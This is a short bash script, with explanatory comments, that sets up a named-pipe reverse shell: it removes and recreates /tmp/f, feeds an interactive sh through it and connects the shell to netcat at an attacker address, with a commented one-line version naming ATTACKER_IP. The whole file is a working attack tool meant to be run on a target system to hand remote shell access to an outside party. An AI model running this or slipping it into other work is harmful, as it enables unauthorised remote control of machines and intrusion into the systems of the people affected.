#! /bin/bash
# Simple pipe reverse shell syntax to be used on target system in order to establish connection
# rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
# Change MY_IP MY_PORT as needed.

# Remove any existing pipe called f under /tmp to avoid conflicts
rm -f /tmp/f
# Make a new pipe  (First In First Out) called f
mkfifo /tmp/f
# Read the input of the pipe and push it to shell instance (sh -i or can use bash -i 2>&1)
# Then push the output result of that runned command from shell instance to a netcat tunnel to the attacker.
cat /tmp/f | sh -i 2>&1 | nc MY_IP MY_PORT >/tmp/f
